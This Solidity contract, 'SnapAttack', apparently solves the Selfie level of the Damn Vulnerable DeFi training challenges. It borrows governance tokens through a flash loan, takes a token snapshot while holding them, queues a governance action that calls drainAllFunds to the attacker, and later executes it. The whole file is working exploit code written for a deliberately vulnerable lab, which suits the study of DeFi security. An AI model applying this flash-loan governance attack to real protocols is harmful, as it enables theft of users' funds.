// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";

contract SnapAttack {
    using Address for address payable;
    SimpleGovernance public governance;
    SelfiePool public pool;

    uint256 public actionId;

    constructor (address payable _governance, address payable _pool) {
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
    }

    function attack(uint256 _amount,address _attacker) external {
        pool.flashLoan(_amount);
        actionId = governance.queueAction(address(pool),abi.encodeWithSignature("drainAllFunds(address)", _attacker),0);
    }

    function receiveTokens(address _tokenAddress, uint256 _borrowAmount) external payable {
       ERC20Snapshot _token = ERC20Snapshot(_tokenAddress);
       DamnValuableTokenSnapshot _tokenSnap = DamnValuableTokenSnapshot(_tokenAddress);

       _tokenSnap.snapshot();
       _token.transfer(msg.sender, _borrowAmount);
    }

    function executeRemoteFunc(uint256 _actionId) public {
        governance.executeAction(_actionId);
    }

    receive() external payable {}
}